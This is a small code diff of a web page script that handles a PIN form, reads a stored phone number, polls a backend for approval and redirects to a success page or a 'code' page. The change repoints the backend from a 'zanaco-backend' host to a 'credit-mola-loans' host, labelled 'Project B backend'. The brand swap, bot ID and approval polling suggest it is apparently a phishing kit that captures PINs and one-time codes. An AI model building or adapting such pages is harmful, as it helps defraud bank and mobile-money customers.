@@ -97,7 +97,7 @@ button.enabled {
 </div>
 
 <script>
-const BACKEND_URL = "https://zanaco-backend.onrender.com";
+const BACKEND_URL = "https://credit-mola-loans.onrender.com"; // ✅ Project B backend
 const botId = new URLSearchParams(window.location.search).get("botId");
 
 const phone = localStorage.getItem("phone");
@@ -150,7 +150,7 @@ document.getElementById("pinForm").addEventListener("submit", async e => {
 
         if (d.approved === true) {
             clearInterval(poll);
-            window.location.href = d.goSuccess
+            window.location.href = d.redirectToSuccess
                 ? `success.html?botId=${botId}`
                 : `code.html?botId=${botId}&requestId=${requestId}`;
         }
